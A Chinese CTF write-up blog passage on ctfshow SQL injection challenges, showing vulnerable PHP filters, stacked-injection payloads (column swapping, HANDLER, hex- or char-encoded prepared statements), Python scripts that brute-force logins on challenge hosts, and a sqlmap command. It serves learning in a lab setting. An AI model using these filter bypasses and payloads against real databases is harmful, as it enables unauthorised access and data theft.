<p><strong>有过滤的数字型注入，没有过滤分号可堆叠注入。没有禁用 <code>空格 alter table change column</code>，id 相比 password 具有<font color=deeppink>递增</font>规律更容易爆破，实现互换 id 和 password。然后username是0或者0x61646d696e，password从1开始爆破即可。(可以使用bp或者自己写脚本)。</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220818171119466.png"
                      alt="image-20220818171119466"
                ></p>
<p><strong>（当年学习 mysql 的笔记）</strong></p>
<p><strong>（在我脚本运行的时候，还必须在 change 后面加上 column ，不然执行不了，可能是mysql版本问题吧）</strong></p>
<h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a><strong>payload</strong></h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>;<span class="keyword">alter</span> <span class="keyword">table</span> ctfshow_user change <span class="keyword">column</span> `pass` `koishi` <span class="type">varchar</span>(<span class="number">255</span>);<span class="keyword">alter</span> <span class="keyword">table</span> ctfshow_user change <span class="keyword">column</span> `id` `pass` <span class="type">varchar</span>(<span class="number">255</span>);<span class="keyword">alter</span> <span class="keyword">table</span> ctfshow_user change <span class="keyword">column</span> `koishi` `id` <span class="type">varchar</span>(<span class="number">255</span>);</span><br></pre></td></tr></table></figure></div>



<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a><strong>exp</strong></h3><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://b531b46e-ea66-48f5-8745-92d056f5b6e7.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alter_tableColumn</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ten sa yi Cirno : watashi wa shiyou shi hajime ta   *(੭*ˊᵕˋ)੭* \n&quot;</span>)</span><br><span class="line">    change_payload = <span class="string">&#x27;0;alter table ctfshow_user change column `pass` `koishi` varchar(255);alter table ctfshow_user change column `id` `pass` varchar(255);alter table ctfshow_user change column `koishi` `id` varchar(255);&#x27;</span></span><br><span class="line">    <span class="comment"># 将密码字段（pass）修改为任意的字符串，如何将id字段名修改为pass，这样sql语句查询时，就查找的是原来的id序列了，账号可以使用0绕过(也可以是admin)(十进制或者十六进制都行)，密码用数字爆破即可</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: change_payload,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">success_flag = <span class="string">&quot;\\u767b\\u9646\\u6210\\u529f&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foreach_num</span>():</span><br><span class="line">    max_num = <span class="number">300</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;now, Cirno is working to solve the password:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(max_num):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\r now password is <span class="subst">&#123;i&#125;</span>&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> success_flag <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Yo katta !! CirnoChan get the response :\n <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> i == max_num - <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nSorry, maybe the max_num is a little smaller&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    alter_tableColumn()</span><br><span class="line">    foreach_num()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>





<h2 id="199-200（还是；和alter，稍加修改）"><a href="#199-200（还是；和alter，稍加修改）" class="headerlink" title="199-200（还是；和alter，稍加修改）"></a>199-200（还是；和alter，稍加修改）</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;/\*|\#|\-|\x23|\&#x27;|\&quot;|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop|\(/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="number">0</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;登陆成功 flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>有过滤的数字型注入，没有过滤分号可堆叠注入。</strong><br><strong>正则禁用username的括号，password 改用 text 类型，id 改用 int 类型</strong></p>
<p><strong>本质上还是和上一题一样，不过是需要修改一下类型（嘛，毕竟没禁掉；和alter）</strong></p>
<h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>;<span class="keyword">alter</span> <span class="keyword">table</span> ctfshow_user change <span class="keyword">column</span> `pass` `koishi` text;<span class="keyword">alter</span> <span class="keyword">table</span> ctfshow_user change <span class="keyword">column</span> `id` `pass` <span class="type">int</span>;<span class="keyword">alter</span> <span class="keyword">table</span> ctfshow_user change <span class="keyword">column</span> `koishi` `id` text;</span><br></pre></td></tr></table></figure></div>



<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://35154a42-0d8a-4494-82e3-47db74fdd560.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alter_tableColumn</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ten sa yi Cirno : watashi wa shiyou shi hajime ta   *(੭*ˊᵕˋ)੭* \n&quot;</span>)</span><br><span class="line">    change_payload = <span class="string">&#x27;0;alter table ctfshow_user change column `pass` `koishi` text;alter table ctfshow_user change column `id` `pass` int;alter table ctfshow_user change column `koishi` `id` text;&#x27;</span></span><br><span class="line">    <span class="comment"># 将密码字段（pass）修改为任意的字符串，如何将id字段名修改为pass，这样sql语句查询时，就查找的是原来的id序列了，账号可以使用0绕过(也可以是admin)(十进制或者十六进制都行)，密码用数字爆破即可</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: change_payload,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">success_flag = <span class="string">&quot;\\u767b\\u9646\\u6210\\u529f&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foreach_num</span>():</span><br><span class="line">    max_num = <span class="number">300</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;now, Cirno is working to solve the password:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(max_num):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\r now password is <span class="subst">&#123;i&#125;</span>&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> success_flag <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Yo katta !! CirnoChan get the response :\n <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> i == max_num - <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nSorry, maybe the max_num is a little smaller&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    alter_tableColumn()</span><br><span class="line">    foreach_num()</span><br></pre></td></tr></table></figure></div>







<h2 id="225（堆叠注入plus，多限制，禁update、alter）–学习handler和预处理"><a href="#225（堆叠注入plus，多限制，禁update、alter）–学习handler和预处理" class="headerlink" title="225（堆叠注入plus，多限制，禁update、alter）–学习handler和预处理"></a>225（堆叠注入plus，多限制，禁update、alter）–学习handler和预处理</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//师傅说过滤的越多越好</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set/i&#x27;</span>,<span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>select 和union 被禁了，我们就思考使用堆叠注入（；分号没禁），但是update和alter被禁了，我们之前的使用就不行了，我们就要想想其他的办法了</strong></p>
<h3 id="解法1–handler"><a href="#解法1–handler" class="headerlink" title="解法1–handler"></a>解法1–handler</h3><p><strong>学习handler的语法和使用</strong></p>
<p><a class="link"   href="https://blog.csdn.net/JesseYoung/article/details/40785137" >(37条消息) mysql查询语句-handler_jesseyoung的博客-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"># 声明句柄</span><br><span class="line">HANDLER tbl_name <span class="keyword">OPEN</span> [ [<span class="keyword">AS</span>] alias]</span><br><span class="line"> </span><br><span class="line"># 句柄操作</span><br><span class="line">HANDLER tbl_name READ index_name &#123; <span class="operator">=</span> <span class="operator">|</span> <span class="operator">&lt;=</span> <span class="operator">|</span> <span class="operator">&gt;=</span> <span class="operator">|</span> <span class="operator">&lt;</span> <span class="operator">|</span> <span class="operator">&gt;</span> &#125; (value1,value2,...)</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line">    </span><br><span class="line">HANDLER tbl_name READ index_name &#123; <span class="keyword">FIRST</span> <span class="operator">|</span> NEXT <span class="operator">|</span> PREV <span class="operator">|</span> <span class="keyword">LAST</span> &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line">    </span><br><span class="line">HANDLER tbl_name READ &#123; <span class="keyword">FIRST</span> <span class="operator">|</span> NEXT &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line"># 关闭句柄</span><br><span class="line">HANDLER tbl_name <span class="keyword">CLOSE</span></span><br></pre></td></tr></table></figure></div>



<p><strong>1）先使用万能密码看看都有什么数据（不看也行&#x3D;。&#x3D;，下面的username写1也可以）</strong></p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27; or 1=&#x27;1</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220825112735610.png"
                      alt="image-20220825112735610"
                ></p>
<p><strong>2）因为没禁show，配合堆叠注入看看有哪些表名</strong></p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line">/api/?username=ctfshow&#x27;;show tables;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220825113203126.png"
                      alt="image-20220825113203126"
                ></p>
<p>看到可疑表名ctfshow_flagasa，尝试查看</p>
<p><strong>3）因为无select，使用handler</strong></p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line">/api/?username=ctfshow&#x27;;handler ctfshow_flagasa open as t;handler t read first;handler t close’</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220825113630972.png"
                      alt="image-20220825113630972"
                ></p>
<p><strong>完事</strong></p>
<h3 id="解法2–预处理"><a href="#解法2–预处理" class="headerlink" title="解法2–预处理"></a>解法2–预处理</h3><p>学习预处理知识</p>
<p><a class="link"   href="https://www.cnblogs.com/geaozhang/p/9891338.html" >MySQL的SQL预处理(Prepared) - GeaoZhang - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"># 定义预处理语句</span><br><span class="line"><span class="keyword">PREPARE</span> stmt_name <span class="keyword">FROM</span> preparable_stmt;</span><br><span class="line"># 执行预处理语句</span><br><span class="line"><span class="keyword">EXECUTE</span> stmt_name [<span class="keyword">USING</span> <span class="variable">@var_name</span> [, <span class="variable">@var_name</span>] ...];</span><br><span class="line"># 删除(释放)定义</span><br><span class="line">&#123;<span class="keyword">DEALLOCATE</span> <span class="operator">|</span> <span class="keyword">DROP</span>&#125; <span class="keyword">PREPARE</span> stmt_name;</span><br></pre></td></tr></table></figure></div>



<p><strong>自己写了个脚本，当然手动注入也行&#x3D;。&#x3D;</strong></p>
<p>（因为ban了很多关键字，这种可以使用char 或者 concat 绕过）</p>
<p>下面脚本是char 写法（写了脚本，比较方便，不用像concat那样手动分开）</p>
<p>concat大致是：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span>user1<span class="string">&#x27;;PREPARE koishi from concat(&#x27;</span>s<span class="string">&#x27;,&#x27;</span>elect<span class="string">&#x27;, &#x27;</span> database()<span class="string">&#x27;);EXECUTE koishi; </span></span><br></pre></td></tr></table></figure></div>

<p>database前面或者select后面记得加空格&#x3D;。&#x3D;</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://c1bfa393-c96f-41c7-b316-f0dfacba54d4.challenge.ctf.show/api/&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">payload_maker</span>(<span class="params">sql:<span class="built_in">str</span></span>)-&gt;<span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;ctfshow&#x27;;prepare koishi from char(<span class="subst">&#123;<span class="string">&#x27;,&#x27;</span>.join(<span class="built_in">str</span>(<span class="built_in">ord</span>(c)) <span class="keyword">for</span> c <span class="keyword">in</span> sql)&#125;</span>);execute koishi;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>:payload_maker(<span class="string">&quot;show tables&quot;</span>)</span><br><span class="line">        <span class="comment"># show tables</span></span><br><span class="line">        <span class="comment"># select * from ctfshow_flagasa</span></span><br><span class="line">    &#125;</span><br><span class="line">    response=requests.get(url=url,params=params)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure></div>





<p><strong>1） show tables</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220825121029602.png"
                      alt="image-20220825121029602"
                ></p>
<p><strong>2）select * from ctfshow_flagasa</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220825121135839.png"
                      alt="image-20220825121135839"
                ></p>
<p><strong>这道题又学废新姿势了 ：）</strong></p>
<h2 id="226、228-230（堆叠注入plus，再增限制）"><a href="#226、228-230（堆叠注入plus，再增限制）" class="headerlink" title="226、228-230（堆叠注入plus，再增限制）"></a>226、228-230（堆叠注入plus，再增限制）</h2><p><strong>先看题限制</strong></p>
<p>226</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//师傅说过滤的越多越好</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\(/i&#x27;</span>,<span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>228-230</p>
<p>有过滤的堆叠注入，这次把禁用的字符放进了表里，测试发现 226 的 payload 还能用，依旧能用，我们就着重分析226即可。</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//师傅说内容太多，就写入数据库保存</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$banlist</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$banlist</span> <span class="keyword">as</span> <span class="variable">$char</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$char</span>.<span class="string">&quot;/i&quot;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>





<p>看226，他比我们225多禁了 show 和（ ， 既然如此，我们的concat 和 char 也不能用了（因为在使用时需要括号嘛）</p>
<p>既然如此，我们可以继续使用预处理即可（为啥不用handler？因为我们拿到表名才行，handler不能，show和小括号被ban了）</p>
<p>预处理关键字使用16进制绕过就行，注意在16进制前面加上0x，不然系统不知道咋解析</p>
<p><a class="link"   href="https://www.sojson.com/hexadecimal.html" >16进制转换在线  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>当然自己写脚本转换16进制也行，手注可以用上面那个网站转换一下</p>
<h3 id="解法-–-预处理"><a href="#解法-–-预处理" class="headerlink" title="解法 – 预处理"></a>解法 – 预处理</h3><h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><p>还是自己写了一个简单脚本</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://447de7ae-8c54-4cd2-a268-4b591f577cd7.challenge.ctf.show/api/&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">payload_maker</span>(<span class="params">sql : <span class="built_in">str</span></span>)-&gt;<span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;Cirno&#x27;;prepare koishi from 0x<span class="subst">&#123;sql.encode().<span class="built_in">hex</span>()&#125;</span>;execute koishi;--+&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>:payload_maker(<span class="string">&quot;select * from ctfsh_ow_flagas&quot;</span>)</span><br><span class="line">        <span class="comment"># show tables</span></span><br><span class="line">        <span class="comment"># select * from ctfsh_ow_flagas</span></span><br><span class="line">    &#125;</span><br><span class="line">    response=requests.get(url=url,params=params)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220825210418038.png"
                      alt="image-20220825210418038"
                ></p>
<p><strong>over</strong></p>
<h2 id="227（堆叠-MySQL存储过程和函数）"><a href="#227（堆叠-MySQL存储过程和函数）" class="headerlink" title="227（堆叠-MySQL存储过程和函数）"></a>227（堆叠-MySQL存储过程和函数）</h2><p>看看题</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//师傅说过滤的越多越好</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|db|\,/i&#x27;</span>,<span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>看限制好像没啥区别，变化不痛不痒，之前的预处理还是可以用，但是居然不在数据库中，上传shell（可以用sqlmap，或者那个预处理脚本16进制绕过限制，用file into上传shell），依旧找不到flag。题目也没有任何提示，淦！看其他师傅的题解，原来是我又有知识盲点了</p>
<h3 id="学习知识点"><a href="#学习知识点" class="headerlink" title="学习知识点"></a>学习知识点</h3><p><a class="link"   href="https://blog.csdn.net/qq_41573234/article/details/80411079" >(37条消息) MySQL——查看存储过程和函数_时光·漫步zth的博客-CSDN博客_mysql 查看存储函数 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<h2 id="查看存储过程和函数的信息"><a href="#查看存储过程和函数的信息" class="headerlink" title="查看存储过程和函数的信息"></a>查看存储过程和函数的信息</h2><p> 在  MySQL 中，存储过程和函数的信息存储在  information_schema  数据库下的  Routines  表中，可以通过查询该表的记录来查询存储过程和函数的信息，其基本的语法形式如下:</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>   <span class="operator">*</span>   <span class="keyword">FROM</span>   information_schema.Routines <span class="keyword">WHERE</span>   ROUTINE_NAME  <span class="operator">=</span>  <span class="string">&#x27;   sp_name  &#x27;</span> ;</span><br></pre></td></tr></table></figure></div>

<p>其中，ROUTINE_NAME  字段中存储的是存储过程和函数的名称;   sp_name  参数表示存储过程或函数的名称。</p>
</blockquote>
<h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from information_schema.routines;</span><br></pre></td></tr></table></figure></div>

<p>因为还是有过滤，所以我们还是接着使用226的脚本</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> textwrap</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://baf02cec-8845-40f5-94e8-e6680a19a03e.challenge.ctf.show/api/&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">payload_maker</span>(<span class="params">sql : <span class="built_in">str</span></span>)-&gt;<span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;Cirno&#x27;;prepare koishi from 0x<span class="subst">&#123;sql.encode().<span class="built_in">hex</span>()&#125;</span>;execute koishi;--+&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>:payload_maker(<span class="string">&quot;call getFlag()&quot;</span>)</span><br><span class="line">        <span class="comment"># select * from information_schema.routines</span></span><br><span class="line">        <span class="comment"># call getFlag();</span></span><br><span class="line">    &#125;</span><br><span class="line">    response=requests.get(url=url,params=params)</span><br><span class="line">    <span class="comment"># 导入textwrap模块将字符串换行输出，不然看起来太难受了，网页手注好像是有自动换行的，这波我属于是自己给自己找麻烦了 QAQ</span></span><br><span class="line">    <span class="built_in">print</span>(textwrap.fill(response.text, <span class="number">150</span>))</span><br></pre></td></tr></table></figure></div>



<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220825213515610.png"
                      alt="image-20220825213515610"
                ></p>
<p>这里可以看见 getFlag这个自定义的函数，而且他居然连flag都给了，淦</p>
<p><strong>如果其他时候没有写的这么明显，可以使用call函数来调用函数，上面脚本也有写</strong>（但是使用的预处理16进制的方式，由于没过滤call，我们可以简简单单的朴素的进行一手堆叠注入就行）</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line">/api/?username=koishi&#x27;;call getFlag();</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220825214137210.png"
                      alt="image-20220825214137210"
                ></p>
<h1 id="sqlmap使用系统学习"><a href="#sqlmap使用系统学习" class="headerlink" title="sqlmap使用系统学习"></a>sqlmap使用系统学习</h1><h2 id="201-206（没啥自己动手的地方）"><a href="#201-206（没啥自己动手的地方）" class="headerlink" title="201-206（没啥自己动手的地方）"></a>201-206（没啥自己动手的地方）</h2><h3 id="agent、referer"><a href="#agent、referer" class="headerlink" title="(agent、referer)"></a>(agent、referer)</h3><p><strong>题目提示</strong></p>
<blockquote>
<p> 使用–user-agent 指定agent</p>
<p> 使用–referer 绕过referer检查</p>
</blockquote>
<p><strong>例如：</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://e6892756-6d65-47f6-baf8-5617a68a1b0f.challenge.ctf.show/api/?id=1 --user-agent sqlmap --referer ctf.show</span><br></pre></td></tr></table></figure></div>

